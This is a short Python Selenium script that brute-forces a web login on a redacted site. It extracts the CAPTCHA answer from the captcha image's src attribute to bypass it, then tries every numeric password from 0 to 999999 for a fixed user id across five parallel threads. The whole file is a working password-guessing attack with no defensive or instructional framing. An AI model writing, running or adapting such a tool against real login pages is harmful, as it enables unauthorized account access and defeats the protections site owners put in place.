from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert
from time import sleep
import threading 
import os
#browser= webdriver.Chrome(executable_path=r"chromedriver.exe")
def task1(num1,num2,lock,tname):
    chrome_options=webdriver.ChromeOptions()
    prefs = {"profile.managed_default_content_settings.images": 2}
    chrome_options.add_experimental_option("prefs", prefs)      #for not loading images
    browser= webdriver.Chrome(executable_path=r"chromedriver.exe",options=chrome_options)  #to open chrome
    #browser= webdriver.Chrome(executable_path=r"chromedriver.exe")
    browser.get('****************') #confidential
    browser.get('****************') #confidential
 
    browser.switch_to.frame(browser.find_element_by_name("banner"))
    for i in range(num1,num2):
        lock.acquire() 
        img=browser.find_element_by_id('captchaimg')
        src=img.get_attribute('src')
        captcha=src[-9]+src[-8]+src[-7]+src[-6]+src[-5] #extract captcha value from captchaimg by inspecting source code
        browser.find_element_by_id('uid').send_keys("XXXX") #user id
        browser.find_element_by_id('pwd').send_keys(str(i))
        browser.find_element_by_id('cap').send_keys(captcha)
        browser.find_element_by_id('login').click()
        print(" "+str(tname)+":"+str(i))
        lock.release() 
tlist=[]
num1,num2=0,999999
if __name__=='__main__':
    for i in range(5):
        lock = threading.Lock()         
        t1 = threading.Thread(target=task1, name='t1',args=(num1,num1+200000,lock,i+1,)) #threads created here
        num1=num1+200000
        tlist.append(t1)
        #t1.start()
    for i in range(5):
        tlist[i].start()  #threads are started
    for i in range(5):
        tlist[i].join()     #threads are joined
